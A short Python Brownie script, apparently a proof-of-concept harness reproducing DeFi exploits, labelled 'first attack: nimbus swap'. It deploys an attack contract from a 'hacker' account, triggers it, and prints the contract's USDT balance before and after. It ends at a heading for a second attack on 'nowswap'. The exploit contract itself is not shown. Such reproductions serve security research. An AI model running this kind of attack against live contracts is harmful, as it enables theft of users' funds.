from brownie import accounts, interface, Luck, chain
from rich import print as rp

def main():
    rp('[green bold]--------------- first attack: nimbus swap -----------------[/]')
    hacker = accounts[0]
    luck = Luck.deploy({
            'from': hacker
        })
    usdt = interface.ERC20('0xdAC17F958D2ee523a2206206994597C13D831ec7')
    rp(f':vampire: [bold]Before[/] USDT balance of attack contract is {usdt.balanceOf(luck)}')
    luck.luck({
        'from': hacker
    })
    rp(f':vampire: [bold]After[/] USDT balance of attack contract is {usdt.balanceOf(luck)}')

    chain.reset()

    rp('[green bold]--------------- second attack: nowswap -----------------[/]')

